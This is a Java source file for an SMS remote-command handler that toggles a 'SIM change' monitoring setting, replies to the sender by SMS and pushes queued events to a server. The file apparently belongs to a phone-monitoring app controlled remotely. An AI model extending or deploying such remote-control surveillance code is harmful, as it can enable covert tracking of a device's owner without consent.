package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.pref.PrefSystem;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSEnableSIM extends RmtCmdSync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public SMSEnableSIM(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader(smsCmdCode.getEnableSIMCmd());
		try {
			Preference pref = Global.getPreference();
			PrefSystem system = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
			system.setSIMChangeEnabled(true);
			String replyMsg = RmtCmdTextResource.SIM_ENABLED;
			if (rmtCmdLine.getEnabled() == DISABLE) {
				system.setSIMChangeEnabled(false);
				replyMsg = RmtCmdTextResource.SIM_DISABLED;
			}
			pref.commit(system);
			responseMessage.append(Constant.OK);
			responseMessage.append(replyMsg);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
		}
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdStartSIM.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
